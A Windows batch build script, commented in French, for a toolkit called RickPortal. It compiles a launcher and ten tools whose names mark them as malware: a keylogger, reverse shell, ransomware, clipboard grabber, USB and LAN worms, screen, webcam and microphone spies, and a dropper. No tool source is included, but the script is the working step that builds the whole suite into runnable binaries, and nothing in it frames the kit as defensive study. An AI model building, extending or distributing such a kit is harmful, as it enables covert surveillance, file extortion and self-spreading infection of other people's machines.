@echo off
REM RickPortal - build.bat - compile le launcher + les 10 tools
REM Usage: lancer depuis un "Developer Command Prompt for VS" (cl dispo),
REM        ou avec MinGW-w64 dans le PATH (g++ dispo).
setlocal enabledelayedexpansion
if not exist build mkdir build

where cl >nul 2>nul
if %errorlevel%==0 goto :msvc
where g++ >nul 2>nul
if %errorlevel%==0 goto :mingw
echo [!] Aucun compilateur trouve. Installe VS Build Tools ou MinGW-w64.
exit /b 1

:msvc
echo [*] MSVC detecte - compilation...
cl /nologo /O2 /EHsc /std:c++17 src\rick_lab.cpp /Fe:build\rick_lab.exe /link user32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\01_keylogger.cpp       /Fe:build\01_keylogger.exe       /link user32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\02_reverse_shell.cpp   /Fe:build\02_reverse_shell.exe   /link ws2_32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\03_ransomware.cpp      /Fe:build\03_ransomware.exe      /link bcrypt.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\04_clipboard.cpp       /Fe:build\04_clipboard.exe       /link user32.lib advapi32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\05_usb_worm.cpp        /Fe:build\05_usb_worm.exe
cl /nologo /O2 /EHsc /std:c++17 src\tools\06_lan_worm.cpp        /Fe:build\06_lan_worm.exe        /link ws2_32.lib mpr.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\07_screenspy.cpp       /Fe:build\07_screenspy.exe       /link gdi32.lib user32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\08_webcam.cpp          /Fe:build\08_webcam.exe          /link avicap32.lib user32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\09_dropper.cpp         /Fe:build\09_dropper.exe         /link urlmon.lib advapi32.lib
cl /nologo /O2 /EHsc /std:c++17 src\tools\10_mic_rec.cpp         /Fe:build\10_mic_rec.exe         /link winmm.lib
goto :end

:mingw
echo [*] MinGW detecte - compilation...
g++ -O2 -std=c++17 src\rick_lab.cpp             -o build\rick_lab.exe
g++ -O2 -std=c++17 src\tools\01_keylogger.cpp   -o build\01_keylogger.exe   -luser32
g++ -O2 -std=c++17 src\tools\02_reverse_shell.cpp -o build\02_reverse_shell.exe -lws2_32
g++ -O2 -std=c++17 src\tools\03_ransomware.cpp  -o build\03_ransomware.exe  -lbcrypt
g++ -O2 -std=c++17 src\tools\04_clipboard.cpp   -o build\04_clipboard.exe   -ladvapi32
g++ -O2 -std=c++17 src\tools\05_usb_worm.cpp    -o build\05_usb_worm.exe
g++ -O2 -std=c++17 src\tools\06_lan_worm.cpp    -o build\06_lan_worm.exe    -lws2_32 -lmpr
g++ -O2 -std=c++17 src\tools\07_screenspy.cpp   -o build\07_screenspy.exe   -lgdi32
g++ -O2 -std=c++17 src\tools\08_webcam.cpp      -o build\08_webcam.exe      -lavicap32
g++ -O2 -std=c++17 src\tools\09_dropper.cpp     -o build\09_dropper.exe     -lurlmon -ladvapi32
g++ -O2 -std=c++17 src\tools\10_mic_rec.cpp     -o build\10_mic_rec.exe     -lwinmm

:end
echo.
echo [OK] Binaire dans build\ - lance build\rick_lab.exe
endlocal
